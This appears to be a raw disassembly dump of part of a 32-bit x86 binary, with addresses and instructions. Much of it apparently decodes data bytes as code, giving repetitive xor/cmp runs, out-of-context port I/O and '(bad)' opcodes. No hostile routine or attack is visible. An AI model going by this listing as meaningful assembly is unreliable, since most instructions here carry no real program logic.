  4247c9:	and    al,0xbf
  4247cb:	and    BYTE PTR [edx-0x2e],0xf8
  4247cf:	gs push edx
  4247d1:	xchg   ebx,eax
  4247d2:	ret    0xb4f1
  4247d5:	adc    esi,DWORD PTR [ebp+0x3a]
  4247d8:	cmp    DWORD PTR [ebp-0x625d2c34],ebp
  4247de:	push   edi
  4247df:	push   cs
  4247e0:	pop    ds
  4247e1:	xchg   ebx,eax
  4247e2:	add    ecx,DWORD PTR [edx]
  4247e4:	sti    
  4247e5:	aad    0x8
  4247e7:	xor    ah,BYTE PTR [eax]
  4247e9:	ins    BYTE PTR es:[edi],dx
  4247ea:	les    edi,FWORD PTR [ecx-0x27]
  4247ed:	in     eax,dx
  4247ee:	adc    ecx,DWORD PTR [eax]
  4247f0:	out    dx,al
  4247f1:	mov    bl,0xb9
  4247f3:	mov    ah,0x20
  4247f5:	mov    ebp,0x0
	...
  42483a:	add    BYTE PTR [eax],al
  42483c:	cwde   
  42483d:	and    BYTE PTR [eax],dl
  42483f:	add    BYTE PTR [eax+0x3],bh
  424842:	adc    BYTE PTR [eax],al
  424844:	mov    ebp,0xf600105c
  424849:	push   ebp
  42484a:	adc    BYTE PTR [eax],al
  42484c:	and    eax,0x3800107b
  424851:	cmp    DWORD PTR [eax],edx
  424853:	add    BYTE PTR [ebp+edx*1+0x1e9b0010],cl
  42485a:	adc    BYTE PTR [eax],al
	...
  42585c:	add    BYTE PTR [eax],dl
  42585e:	add    BYTE PTR [eax],al
  425860:	in     al,dx
  425861:	add    BYTE PTR [eax],al
  425863:	add    BYTE PTR [edx],ch
  425865:	xor    BYTE PTR [eax],dh
  425867:	xor    BYTE PTR ds:0x58304c30,dh
  42586d:	xor    BYTE PTR [esi+0x30],bl
  425870:	xor    BYTE PTR fs:[eax-0x65cf71d0],cl
  425877:	xor    BYTE PTR [eax-0x4ccf59d0],ah
  42587d:	xor    al,al
  42587f:	xor    bh,cl
  425881:	xor    BYTE PTR [edx-0x48ce51cf],ch
  425887:	xor    esp,eax
  425889:	xor    eax,ecx
  42588b:	xor    DWORD PTR [ebp-0x60cc6ece],esp
  425891:	xor    ebp,DWORD PTR [esi-0x3acc47cd]
  425897:	xor    edx,ebp
  425899:	xor    ebx,ebp
  42589b:	xor    esp,esp
  42589d:	xor    ebp,edi
  42589f:	xor    edi,ebp
  4258a1:	xor    ecx,DWORD PTR [eax]
  4258a3:	xor    al,0xc
  4258a5:	xor    al,0x14
  4258a7:	xor    al,0x28
  4258a9:	xor    al,0x2e
  4258ab:	xor    al,0x40
  4258ad:	xor    al,0x46
  4258af:	xor    al,0xf8
  4258b1:	xor    eax,0x360435fc
  4258b6:	push   cs
  4258b7:	sbb    esi,DWORD PTR ss:[esi]
  4258ba:	sub    esi,DWORD PTR [esi]
  4258bc:	xor    DWORD PTR [esi],esi
  4258be:	cmp    eax,0x48364336
  4258c3:	ss dec esi
  4258c5:	ss pop esp
  4258c7:	ss push 0x7f367b36
  4258cd:	ss pop edi
  4258cf:	aaa    
  4258d0:	imul   esi,DWORD PTR [edi],0x7e
  4258d3:	aaa    
  4258d4:	xor    BYTE PTR [edi],0x8d
  4258d7:	aaa    
  4258d8:	call   0xb637:0xb037a937
  4258df:	aaa    
  4258e0:	ret    
  4258e1:	aaa    
  4258e2:	shl    DWORD PTR [edi],cl
  4258e4:	mov    ah,0x38
  4258e6:	mov    ebp,0xce38ca38
  4258eb:	cmp    dh,dl
  4258ed:	cmp    dl,ah
  4258ef:	cmp    dl,dh
  4258f1:	cmp    dh,dh
  4258f3:	cmp    BYTE PTR [ebx-0x33c53fc6],dh
  4258f9:	cmp    ah,dl
  4258fb:	cmp    ch,dh
  4258fd:	cmp    dh,ch
  4258ff:	cmp    bh,bl
  425901:	cmp    al,BYTE PTR [edi]
  425903:	cmp    ecx,DWORD PTR [ebx+edi*1]
  425906:	adc    eax,0x2a3b1b3b
  42590b:	cmp    esi,DWORD PTR [ecx]
  42590d:	cmp    esi,DWORD PTR [edi]
  42590f:	cmp    eax,DWORD PTR [ebx+edi*1+0x30]
  425913:	cmp    al,0x34
  425915:	cmp    al,0x3e
  425917:	cmp    al,0x44
  425919:	cmp    al,0x49
  42591b:	cmp    al,0x52
  42591d:	cmp    al,0x5b
  42591f:	cmp    al,0x6a
  425921:	cmp    al,0x71
  425923:	cmp    al,0x77
  425925:	cmp    al,0x84
  425927:	cmp    al,0x9d
  425929:	cmp    al,0xa6
  42592b:	cmp    al,0xac
  42592d:	cmp    al,0xb9
  42592f:	cmp    al,0xc0
  425931:	cmp    al,0xce
  425933:	cmp    al,0xd7
  425935:	cmp    al,0xba
  425937:	cmp    eax,0x3dd13dc4
  42593c:	loope  0x42597b
  42593e:	out    0x3d,eax
  425940:	hlt    
  425941:	cmp    eax,0x3e013dfb
  425946:	or     BYTE PTR [esi],bh
  425948:	add    BYTE PTR [eax],ah
  42594a:	add    BYTE PTR [eax],al
  42594c:	dec    eax
  42594d:	add    BYTE PTR [eax],al
  42594f:	add    BYTE PTR [ebx],bh
  425951:	cmp    al,0x4c
  425953:	cmp    al,0x52
  425955:	cmp    al,0x58
  425957:	cmp    al,0x65
  425959:	cmp    al,0x73
  42595b:	cmp    al,0x7f
  42595d:	cmp    al,0x85
  42595f:	cmp    al,0x94
  425961:	cmp    al,0x9a
  425963:	cmp    al,0xa5
  425965:	cmp    al,0xaf
  425967:	cmp    al,0xb6
  425969:	cmp    al,0xbc
  42596b:	cmp    al,0xc8
  42596d:	cmp    al,0xd6
  42596f:	cmp    al,0xdc
  425971:	cmp    al,0xe9
  425973:	cmp    al,0xf0
  425975:	cmp    al,0xf6
  425977:	cmp    al,0x9
  425979:	cmp    eax,0x3d203d13
  42597e:	sub    al,0x3d
  425980:	xor    DWORD PTR ds:0x3d403d3b,edi
  425986:	inc    ebp
  425987:	cmp    eax,0x3d513d4b
  42598c:	pop    eax
  42598d:	cmp    eax,0x30000000
  425992:	add    BYTE PTR [eax],al
  425994:	or     al,0x1
  425996:	add    BYTE PTR [eax],al
  425998:	push   ebx
  425999:	xor    bl,BYTE PTR [ecx+0x32]
  42599c:	xor    ch,BYTE PTR gs:[ebx+0x32]
  4259a0:	jae    0x4259d4
  4259a2:	jns    0x4259d6
  4259a4:	test   BYTE PTR [edx],dh
  4259a6:	mov    BYTE PTR [edx],dh
  4259a8:	(bad)  
  4259a9:	xor    bl,BYTE PTR [esi-0x54cd5ace]
  4259af:	xor    bh,BYTE PTR [eax-0x27cd36ce]
  4259b5:	xor    ah,dh
  4259b7:	xor    ch,dl
  4259b9:	xor    bh,cl
  4259bb:	xor    bh,bh
  4259bd:	xor    ah,BYTE PTR [ecx+0x34]
  4259c0:	addr16 xor al,0x1d
  4259c3:	xor    eax,0x35333529
  4259c8:	cmp    BYTE PTR ds:0x355a3543,dh
  4259ce:	arpl   WORD PTR ds:0x357a356d,si
  4259d4:	xchg   BYTE PTR ds:0x3591358b,dh
  4259da:	xchg   esi,eax
  4259db:	xor    eax,0x35a7359c
  4259e0:	mov    ebx,0xce35c135
  4259e5:	xor    eax,0x3758374f
  4259ea:	pop    esi
  4259eb:	aaa    
  4259ec:	jb     0x425a25
  4259ee:	jnp    0x425a27
  4259f0:	test   DWORD PTR [edi],esi
  4259f2:	mov    WORD PTR [edi],?
  4259f4:	xchg   edx,eax
  4259f5:	aaa    
  4259f6:	sahf   
  4259f7:	aaa    
  4259f8:	lods   al,BYTE PTR ds:[esi]
  4259f9:	aaa    
  4259fa:	mov    dl,0x37
  4259fc:	shl    DWORD PTR [edi],0xc8
  4259ff:	aaa    
  425a00:	into   
  425a01:	aaa    
  425a02:	(bad)  [edi]
  425a04:	call   0x127a5d40
  425a09:	cmp    BYTE PTR [ecx],bl
  425a0b:	cmp    BYTE PTR [edi],bl
  425a0d:	cmp    BYTE PTR [eax+edi*1],ch
  425a10:	cmp    eax,0x49384338
  425a15:	cmp    BYTE PTR [esi+0x38],dl
  425a18:	pop    ebp
  425a19:	cmp    BYTE PTR [eax+0x38],ch
  425a1c:	mov    BYTE PTR [eax],bh
  425a1e:	xchg   esp,eax
  425a1f:	cmp    BYTE PTR [ecx-0x43c74ec8],ah
  425a25:	cmp    dh,cl
  425a27:	cmp    ch,bl
  425a29:	cmp    ah,ah
  425a2b:	cmp    dl,ch
  425a2d:	cmp    bh,dh
  425a2f:	cmp    BYTE PTR [esi],cl
  425a31:	cmp    DWORD PTR [ecx],ebx
  425a33:	cmp    DWORD PTR [esi],esp
  425a35:	cmp    DWORD PTR [edi-0x4fc55bc6],edx
  425a3b:	cmp    bh,BYTE PTR [edx+edi*1+0x3ae63ac8]
  425a42:	idiv   DWORD PTR [edx]
  425a44:	(bad)  
  425a45:	cmp    al,BYTE PTR [ebx+edi*1]
  425a48:	adc    DWORD PTR [ebx],edi
  425a4a:	and    DWORD PTR [ebx],edi
  425a4c:	daa    
  425a4d:	cmp    esi,DWORD PTR [esi]
  425a4f:	cmp    edi,DWORD PTR ds:0x593b483b
  425a55:	cmp    esp,DWORD PTR [eax+0x3b]
  425a58:	cmp    si,WORD PTR [ebx+0x3b]
  425a5c:	xchg   edx,eax
  425a5d:	cmp    ebx,DWORD PTR [edi+0x163ba73b]
  425a63:	cmp    eax,0x3d273d20
  425a68:	sub    eax,0x433d3d3d
  425a6d:	cmp    eax,0x3d5f3d50
  425a72:	jae    0x425ab1
  425a74:	jle    0x425ab3
  425a76:	xchg   BYTE PTR ds:0x3d9c3d96,bh
  425a7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a7d:	cmp    eax,0x3dbc3daf
  425a82:	retf   
  425a83:	cmp    eax,0x3dd73dd1
  425a88:	fidivr WORD PTR ds:0x3df83de9
  425a8e:	(bad)  
  425a8f:	cmp    eax,0x3e123e05
  425a94:	dec    ebx
  425a95:	ds push ecx
  425a97:	ds pop esi
  425a99:	ds gs add BYTE PTR ds:[eax+0x0],dl
  425a9f:	add    BYTE PTR [eax+0x26000000],cl
  425aa5:	xor    DWORD PTR [ebx],esi
  425aa7:	xor    DWORD PTR [edx+0x31],eax
  425aaa:	dec    ecx
  425aab:	xor    DWORD PTR [edi+0x31],ecx
  425aae:	pop    esp
  425aaf:	xor    DWORD PTR [esi+0x31],ebp
  425ab2:	ja     0x425ae5
  425ab4:	xor    DWORD PTR [ecx],0xffffff89
  425ab7:	xor    edx,eax
  425ab9:	xor    edx,ebx
  425abb:	xor    edx,edi
  425abd:	xor    esp,ebp
  425abf:	xor    esi,edi
  425ac1:	xor    eax,DWORD PTR [ebx]
  425ac3:	xor    al,0x7
  425ac5:	xor    al,0x10
  425ac7:	xor    al,0x1a
  425ac9:	xor    al,0x27
  425acb:	xor    al,0x33
  425acd:	xor    al,0x38
  425acf:	xor    al,0x3e
  425ad1:	xor    al,0x43
  425ad3:	xor    al,0x49
  425ad5:	xor    al,0xb6
  425ad7:	xor    eax,0x35d135be
  425adc:	xlat   BYTE PTR ds:[ebx]
  425add:	xor    eax,0x386d3727
  425ae2:	jno    0x425b1c
  425ae4:	jle    0x425b1e
  425ae6:	mov    bh,BYTE PTR [eax]
  425ae8:	xchg   ecx,eax
  425ae9:	cmp    BYTE PTR [edi-0x53c759c8],dl
  425aef:	cmp    BYTE PTR [edx-0x54c489c8],dh
  425af5:	cmp    al,0xb3
  425af7:	cmp    al,0xb9
  425af9:	cmp    al,0xbd
  425afb:	cmp    al,0xcf
  425afd:	cmp    al,0xdf
  425aff:	cmp    al,0xea
  425b01:	cmp    al,0xee
  425b03:	cmp    al,0xf5
  425b05:	cmp    al,0xfc
  425b07:	cmp    al,0x6
  425b09:	cmp    eax,0x3d2d3d13
  425b0e:	xor    edi,DWORD PTR ds:0x3d493d42
  425b14:	dec    edi
  425b15:	cmp    eax,0x3d613d56
  425b1a:	lahf   
  425b1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b1d:	ds loope 0x425b5f
  425b20:	jmp    0x425b61
  425b22:	clc    
  425b23:	aas    
  425b24:	add    BYTE PTR [eax+0x0],ah
  425b27:	add    BYTE PTR [eax+0x0],bh
  425b2a:	add    BYTE PTR [eax],al
  425b2c:	add    al,0x30
  425b2e:	or     dh,BYTE PTR [eax]
  425b30:	adc    dh,BYTE PTR [eax]
  425b32:	sbb    BYTE PTR [eax],dh
  425b34:	xor    DWORD PTR [eax],esi
  425b36:	inc    edx
  425b37:	xor    BYTE PTR [edi+0x30],cl
  425b3a:	pusha  
  425b3b:	xor    BYTE PTR [esi+0x30],ah
  425b3e:	ins    BYTE PTR es:[edi],dx
  425b3f:	xor    BYTE PTR [ecx+0x30],bh
  425b42:	mov    dh,BYTE PTR [eax]
  425b44:	lahf   
  425b45:	xor    BYTE PTR [edx-0x32cf41d0],dh
  425b4b:	xor    dl,ah
  425b4d:	xor    bh,ch
  425b4f:	xor    ah,bh
  425b51:	xor    BYTE PTR [edi],al
  425b53:	xor    DWORD PTR [ebx],ecx
  425b55:	xor    DWORD PTR [ebx],edx
  425b57:	xor    DWORD PTR [edi],edx
  425b59:	xor    DWORD PTR [ebx],esp
  425b5b:	xor    DWORD PTR [edi],ebp
  425b5d:	xor    DWORD PTR [ebx],esi
  425b5f:	xor    DWORD PTR [edx],edi
  425b61:	xor    DWORD PTR [ebx+0x31],eax
  425b64:	dec    ecx
  425b65:	xor    DWORD PTR [edi+0x31],ecx
  425b68:	pusha  
  425b69:	xor    DWORD PTR [ecx+esi*1+0x72],ebp
  425b6d:	xor    DWORD PTR [ecx-0x72ce78cf],eax
  425b73:	xor    DWORD PTR [ebx-0x55ce5ecf],ebx
  425b79:	xor    DWORD PTR [ecx+esi*1+0x32ee31b8],esi
  425b80:	repnz xor bh,cl
  425b83:	xor    bh,ch
  425b85:	xor    al,BYTE PTR [esi]
  425b87:	xor    ecx,DWORD PTR [edx]
  425b89:	xor    edi,DWORD PTR [eax+0x35]
  425b8c:	jl     0x425bc3
  425b8e:	dec    edx
  425b8f:	cmp    eax,0x3e883d54
  425b94:	nop
  425b95:	ds cwde 
  425b97:	fstp   TBYTE PTR ds:[edi]
  425b9a:	add    BYTE PTR [eax],al
  425b9c:	add    BYTE PTR [eax+0x0],dh
  425b9f:	add    BYTE PTR [eax+eax*1+0x0],ch
  425ba3:	add    BYTE PTR ds:0x7d327331,ch
  425ba9:	xor    al,BYTE PTR [edx+esi*1+0x3296328a]
  425bb0:	pushf  
  425bb1:	xor    ah,BYTE PTR [edx-0x42cd50ce]
  425bb7:	xor    cl,dl
  425bb9:	xor    al,BYTE PTR [ebp+esi*1+0x5d]
  425bbd:	xor    eax,0x3589356a
  425bc2:	xchg   ebp,eax
  425bc3:	xor    eax,0x35a2359c
  425bc8:	scas   al,BYTE PTR es:[edi]
  425bc9:	xor    eax,0x35ba35b4
  425bce:	int3   
  425bcf:	xor    eax,0x370f35d0
  425bd4:	sbb    esi,DWORD PTR [edi]
  425bd6:	daa    
  425bd7:	aaa    
  425bd8:	sub    esi,DWORD PTR [edi]
  425bda:	xor    esi,DWORD PTR [edi]
  425bdc:	jbe    0x425c16
  425bde:	xchg   BYTE PTR [eax],bh
  425be0:	cwde   
  425be1:	cmp    BYTE PTR [esi-0x4ac754c8],bl
  425be7:	cmp    BYTE PTR [eax+edi*1+0x38d638c2],bh
  425bee:	in     al,dx
  425bef:	cmp    dl,dh
  425bf1:	cmp    BYTE PTR [edi],al
  425bf3:	cmp    DWORD PTR [ecx+edi*1],ecx
  425bf6:	push   ecx
  425bf7:	cmp    bl,BYTE PTR [ebx+0x3a]
  425bfa:	push   0x813a7b3a
  425bff:	cmp    cl,BYTE PTR [esi-0x62c56ac6]
  425c05:	cmp    ah,BYTE PTR [edx+edi*1+0x8000]
  425c0c:	sbb    BYTE PTR [edx],al
  425c0e:	add    BYTE PTR [eax],al
  425c10:	mov    dh,0x30
  425c12:	mov    esp,0xcb30c230
  425c17:	xor    dl,dl
  425c19:	xor    ah,ch
  425c1b:	xor    al,bh
  425c1d:	xor    BYTE PTR [edx],al
  425c1f:	xor    DWORD PTR [ecx],ecx
  425c21:	xor    DWORD PTR [edi],ecx
  425c23:	xor    DWORD PTR [ebx],ebx
  425c25:	xor    DWORD PTR [ecx],esp
  425c27:	xor    DWORD PTR [edi],esp
  425c29:	xor    esp,ebp
  425c2b:	xor    esi,edi
  425c2d:	xor    DWORD PTR [eax],ecx
  425c2f:	xor    dl,BYTE PTR ds:0x2b322532
  425c35:	xor    bh,BYTE PTR [eax]
  425c37:	xor    bh,BYTE PTR [edi]
  425c39:	xor    al,BYTE PTR [ebp+0x32]
  425c3c:	dec    esp
  425c3d:	xor    bl,BYTE PTR [esi+0x33]
  425c40:	xor    ebp,DWORD PTR fs:[esi+0x33]
  425c44:	je     0x425c79
  425c46:	js     0x425c7b
  425c48:	xor    BYTE PTR [ebx],0x90
  425c4b:	xor    edx,DWORD PTR [ebx+esi*1+0x33a533a1]
  425c52:	lods   al,BYTE PTR ds:[esi]
  425c53:	xor    edi,DWORD PTR [ebx-0x37cc3dcd]
  425c59:	xor    edx,ebp
  425c5b:	xor    esp,edi
  425c5d:	xor    ebp,ebp
  425c5f:	xor    edi,edx
  425c61:	xor    eax,DWORD PTR [ecx]
  425c63:	xor    al,0xc
  425c65:	xor    al,0x1b
  425c67:	xor    al,0x25
  425c69:	xor    al,0x2a
  425c6b:	xor    al,0x30
  425c6d:	xor    al,0x36
  425c6f:	xor    al,0x48
  425c71:	xor    al,0x57
  425c73:	xor    al,0x66
  425c75:	xor    al,0x75
  425c77:	xor    al,0x84
  425c79:	xor    al,0x88
  425c7b:	xor    al,0x98
  425c7d:	xor    al,0xc7
  425c7f:	xor    al,0xd0
  425c81:	xor    al,0xdc
  425c83:	xor    al,0xe6
  425c85:	xor    al,0xf3
  425c87:	xor    al,0x5
  425c89:	xor    eax,0x3517350b
  425c8e:	sbb    eax,0x2b352535
  425c93:	xor    eax,0x353b3536
  425c98:	inc    ecx
  425c99:	xor    eax,0x35573550
  425c9e:	pop    ebp
  425c9f:	xor    eax,0x3586356a
  425ca4:	xchg   edx,eax
  425ca5:	xor    eax,0x359e3598
  425caa:	scas   al,BYTE PTR es:[edi]
  425cab:	xor    eax,0x35c735bb
  425cb0:	into   
  425cb1:	xor    eax,0x35e735d4
  425cb6:	in     eax,dx
  425cb7:	xor    eax,0x360035f3
  425cbc:	or     al,0x36
  425cbe:	adc    esi,DWORD PTR [esi]
  425cc0:	sbb    DWORD PTR [esi],esi
  425cc2:	sub    esi,DWORD PTR [esi]
  425cc4:	xor    DWORD PTR [esi],esi
  425cc6:	ds ss inc ebp
  425cc9:	ss dec ebx
  425ccb:	ss pop eax
  425ccd:	ss fs ss push 0x36
  425cd2:	jo     0x425d0a
  425cd4:	jnp    0x425d0c
  425cd6:	xchg   DWORD PTR [esi],esi
  425cd8:	mov    esi,DWORD PTR [esi]
  425cda:	xchg   edx,eax
  425cdb:	ss pushf 
  425cdd:	ss test eax,0xcb36c536
  425ce3:	fdiv   DWORD PTR ss:[esi]
  425ce6:	fbstp  TBYTE PTR [esi]
  425ce8:	in     eax,0x36
  425cea:	in     al,dx
  425ceb:	div    DWORD PTR ss:[esi]
  425cee:	add    DWORD PTR [edi],esi
  425cf0:	or     BYTE PTR [edi],dh
  425cf2:	push   cs
  425cf3:	aaa    
  425cf4:	and    eax,0x38372b37
  425cf9:	aaa    
  425cfa:	aas    
  425cfb:	aaa    
  425cfc:	inc    ebp
  425cfd:	aaa    
  425cfe:	push   edi
  425cff:	aaa    
  425d00:	pop    ebx
  425d01:	aaa    
  425d02:	data16 aaa 
  425d04:	imul   esi,DWORD PTR [edi],0x76
  425d07:	aaa    
  425d08:	xor    DWORD PTR [edi],0xffffffa7
  425d0b:	aaa    
  425d0c:	mov    cl,0x37
  425d0e:	mov    ebx,0xc837c237
  425d13:	aaa    
  425d14:	aam    0x37
  425d16:	out    0x37,eax
  425d18:	in     eax,dx
  425d19:	aaa    
  425d1a:	stc    
  425d1b:	aaa    
  425d1c:	or     BYTE PTR [eax],bh
  425d1e:	push   cs
  425d1f:	cmp    BYTE PTR [eax+edi*1],dl
  425d22:	sbb    DWORD PTR [eax],edi
  425d24:	and    bh,BYTE PTR [eax]
  425d26:	sub    al,0x38
  425d28:	xor    bh,BYTE PTR [eax]
  425d2a:	cmp    BYTE PTR ss:[esi],bh
  425d2d:	cmp    BYTE PTR [edx+0x38],cl
  425d30:	data16 cmp BYTE PTR [eax+edi*1+0x7c],ch
  425d35:	cmp    BYTE PTR [edx-0x6cc773c8],al
  425d3b:	cmp    BYTE PTR [ecx-0x48c74ec8],bl
  425d41:	cmp    ah,al
  425d43:	cmp    dh,cl
  425d45:	cmp    bl,bl
  425d47:	cmp    bl,ch
  425d49:	cmp    cl,dh
  425d4b:	cmp    BYTE PTR [eax],al
  425d4d:	cmp    DWORD PTR [edi],eax
  425d4f:	cmp    DWORD PTR ds:0x1f391439,ecx
  425d55:	cmp    DWORD PTR [eax],esi
  425d57:	cmp    DWORD PTR [edi],esi
  425d59:	cmp    DWORD PTR ds:0x5a394a39,edi
  425d5f:	cmp    DWORD PTR [eax+0x39],esp
  425d62:	outs   dx,DWORD PTR ds:[esi]
  425d63:	cmp    DWORD PTR [esi+0x39],esi
  425d66:	cmp    DWORD PTR [ecx],0x39ab3990
  425d6c:	mov    bl,0x39
  425d6e:	sar    BYTE PTR [ecx],0xd1
  425d71:	cmp    edi,edx
  425d73:	cmp    ebp,ebx
  425d75:	cmp    edx,ebp
  425d77:	cmp    DWORD PTR [ecx],ecx
  425d79:	cmp    cl,BYTE PTR [edi]
  425d7b:	cmp    bl,BYTE PTR [ebx]
  425d7d:	cmp    ah,BYTE PTR [ecx]
  425d7f:	cmp    ch,BYTE PTR [ebx]
  425d81:	cmp    dh,BYTE PTR [ecx]
  425d83:	cmp    al,BYTE PTR [ebx+0x3a]
  425d86:	dec    ebx
  425d87:	cmp    dl,BYTE PTR [ebp+0x3a]
  425d8a:	bound  edi,QWORD PTR [edx]
  425d8c:	jle    0x425dc8
  425d8e:	test   BYTE PTR [edx],bh
  425d90:	xchg   ebx,eax
  425d91:	cmp    bl,BYTE PTR [edx-0x56c55dc6]
  425d97:	cmp    dh,BYTE PTR [edx+edi*1+0x3aca3ac3]
  425d9e:	sar    BYTE PTR [edx],1
  425da0:	fnstsw WORD PTR [edx]
  425da2:	out    dx,eax
  425da3:	cmp    bh,bl
  425da5:	cmp    al,BYTE PTR [ecx]
  425da7:	cmp    ecx,DWORD PTR [ecx]
  425da9:	cmp    edi,DWORD PTR [ebx]
  425dab:	cmp    eax,DWORD PTR [ebp+0x3b]
  425dae:	dec    esp
  425daf:	cmp    edx,DWORD PTR [edx+0x3b]
  425db2:	pop    esi
  425db3:	cmp    esp,DWORD PTR [ebx+edi*1+0x6a]
  425db7:	cmp    esi,DWORD PTR [edi+0x3b]
  425dba:	jle    0x425df7
  425dbc:	test   BYTE PTR [ebx],bh
  425dbe:	xchg   ecx,eax
  425dbf:	cmp    ebx,DWORD PTR [ecx-0x4ac45dc5]
  425dc5:	cmp    edi,DWORD PTR [ebp-0x26c435c5]
  425dcb:	cmp    ebx,edi
  425dcd:	cmp    ebp,edi
  425dcf:	cmp    edi,ecx
  425dd1:	cmp    eax,DWORD PTR [eax]
  425dd3:	cmp    al,0x6
  425dd5:	cmp    al,0x21
  425dd7:	cmp    al,0x2c
  425dd9:	cmp    al,0x32
  425ddb:	cmp    al,0x38
  425ddd:	cmp    al,0x45
  425ddf:	cmp    al,0x4c
  425de1:	cmp    al,0x52
  425de3:	cmp    al,0x69
  425de5:	cmp    al,0x75
  425de7:	cmp    al,0x86
  425de9:	cmp    al,0x8c
  425deb:	cmp    al,0x91
  425ded:	cmp    al,0x9d
  425def:	cmp    al,0xa1
  425df1:	cmp    al,0xa9
  425df3:	cmp    al,0xad
  425df5:	cmp    al,0xb5
  425df7:	cmp    al,0xcb
  425df9:	cmp    al,0xd8
  425dfb:	cmp    al,0xe0
  425dfd:	cmp    al,0xed
  425dff:	cmp    al,0xf3
  425e01:	cmp    al,0x2
  425e03:	cmp    eax,0x3d153d0a
  425e08:	sbb    DWORD PTR ds:0x3d2d3d23,edi
  425e0e:	cmp    bh,BYTE PTR ds:0x3d653d5f
  425e14:	jno    0x425e53
  425e16:	ja     0x425e55
  425e18:	jg     0x425e57
  425e1a:	test   DWORD PTR ds:0x3d8f,edi
  425e20:	add    BYTE PTR [eax+0xb00000],dl
  425e26:	add    BYTE PTR [eax],al
  425e28:	cmp    al,0x30
  425e2a:	xchg   ecx,eax
  425e2b:	xor    al,dl
  425e2d:	xor    al,bl
  425e2f:	xor    ch,bl
  425e31:	xor    BYTE PTR [ebx],cl
  425e33:	xor    DWORD PTR [ecx+esi*1],ebx
  425e36:	xor    DWORD PTR es:[esi],ebp
  425e39:	xor    DWORD PTR [esi],edi
  425e3b:	xor    DWORD PTR [ecx+0x31],ebp
  425e3e:	jne    0x425e71
  425e40:	nop
  425e41:	xor    DWORD PTR [edx+0x2931b531],ebx
  425e47:	xor    ch,BYTE PTR [esi]
  425e49:	xor    dh,BYTE PTR [edi+0x32]
  425e4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e4d:	xor    dh,BYTE PTR [eax-0x41cd4bce]
  425e53:	xor    cl,al
  425e55:	xor    cl,bh
  425e57:	xor    dl,ch
  425e59:	xor    ah,ah
  425e5b:	xor    ch,bh
  425e5d:	xor    dh,ch
  425e5f:	xor    al,BYTE PTR [edx]
  425e61:	xor    ecx,DWORD PTR [ecx]
  425e63:	xor    ecx,DWORD PTR [edi]
  425e65:	xor    ebx,DWORD PTR [ecx-0x4bcb59cc]
  425e6b:	xor    al,0xc0
  425e6d:	xor    al,0xe1
  425e6f:	xor    al,0xeb
  425e71:	xor    al,0xf2
  425e73:	xor    al,0xf8
  425e75:	xor    al,0x7
  425e77:	xor    eax,0x3511350c
  425e7c:	pop    ss
  425e7d:	xor    eax,0x352a351d
  425e82:	ss xor eax,0x354c3545
  425e88:	push   edx
  425e89:	xor    eax,0x356b355f
  425e8e:	jl     0x425ec5
  425e90:	xchg   ebp,eax
  425e91:	xor    eax,0x35b135a2
  425e96:	(bad)  
  425e97:	xor    eax,0x35d835d4
  425e9c:	cmp    BYTE PTR [edi],dh
  425e9e:	inc    esp
  425e9f:	aaa    
  425ea0:	push   esp
  425ea1:	aaa    
  425ea2:	pop    edi
  425ea3:	aaa    
  425ea4:	push   0x74376e37
  425ea9:	aaa    
  425eaa:	xor    DWORD PTR [edi],0x37933787
  425eb0:	cdq    
  425eb1:	aaa    
  425eb2:	lahf   
  425eb3:	aaa    
  425eb4:	xor    bh,BYTE PTR [ebx]
  425eb6:	test   al,0x3c
  425eb8:	lods   al,BYTE PTR ds:[esi]
  425eb9:	cmp    al,0x23
  425ebb:	xor    edi,DWORD PTR ds:[esi]
  425ebe:	aas    
  425ebf:	ds dec esp
  425ec1:	ds push esp
  425ec3:	ds fs outs dx,BYTE PTR ds:[esi]
  425ec7:	ds jnp 0x425f08
  425eca:	sahf   
  425ecb:	mov    ds:0x3ea93e,eax
  425ed1:	rol    BYTE PTR [eax],1
  425ed3:	add    BYTE PTR [eax],bl
  425ed5:	add    BYTE PTR [eax],al
  425ed7:	add    BYTE PTR [edi],bl
  425ed9:	cmp    ah,BYTE PTR [ebx]
  425edb:	cmp    ah,BYTE PTR [edi]
  425edd:	cmp    ch,BYTE PTR [ebx]
  425edf:	cmp    ch,BYTE PTR [edi]
  425ee1:	cmp    dh,BYTE PTR [ebx]
  425ee3:	cmp    dh,BYTE PTR [edi]
  425ee5:	cmp    bh,BYTE PTR [ebx]
  425ee7:	cmp    al,BYTE PTR [eax]
  425ee9:	and    BYTE PTR [edx],al
  425eeb:	add    BYTE PTR [eax],bl
  425eed:	add    BYTE PTR [eax],al
  425eef:	add    BYTE PTR [edx+esi*1+0x32a432a0],bl
  425ef6:	test   al,0x32
  425ef8:	lods   al,BYTE PTR ds:[esi]
  425ef9:	xor    dh,BYTE PTR [eax-0x47cd4bce]
  425eff:	xor    al,BYTE PTR [eax]
  425f01:	push   eax
  425f02:	add    al,0x0
  425f04:	push   0x18000000
  425f09:	xor    BYTE PTR [eax+esi*1],bl
  425f0c:	and    BYTE PTR [eax],dh
  425f0e:	mov    al,ds:0xa831a431
  425f13:	xor    DWORD PTR [ecx+esi*1+0x31b431b0],ebp
  425f1a:	mov    eax,0xc031bc31
  425f1f:	xor    esp,eax
  425f21:	xor    eax,edx
  425f23:	xor    esp,edx
  425f25:	xor    eax,ebx
  425f27:	xor    esp,ebx
  425f29:	xor    eax,esp
  425f2b:	xor    esp,esp
  425f2d:	xor    eax,ebp
  425f2f:	xor    esp,ebp
  425f31:	xor    eax,esi
  425f33:	xor    esp,esi
  425f35:	xor    DWORD PTR [eax],eax
  425f37:	xor    cl,BYTE PTR [edx+esi*1]
  425f3a:	adc    al,0x32
  425f3c:	sub    BYTE PTR [edx],dh
  425f3e:	pop    esp
  425f3f:	xor    ah,BYTE PTR [eax+0x32]
  425f42:	je     0x425f76
  425f44:	lods   al,BYTE PTR ds:[esi]
  425f45:	xor    cl,BYTE PTR [eax+0x33]
  425f48:	sbb    BYTE PTR [eax+eiz*1],dh
  425f4b:	xor    al,0x28
  425f4d:	xor    al,0x2c
  425f4f:	xor    al,0xd4
  425f51:	xor    al,0xd8
  425f53:	xor    al,0xdc
  425f55:	xor    al,0xe0
  425f57:	xor    al,0xe4
  425f59:	xor    al,0xe8
  425f5b:	xor    al,0xec
  425f5d:	xor    al,0xf0
  425f5f:	xor    al,0xf4
  425f61:	xor    al,0xf8
  425f63:	xor    al,0xfc
  425f65:	xor    al,0x0
  425f67:	add    BYTE PTR [eax],al
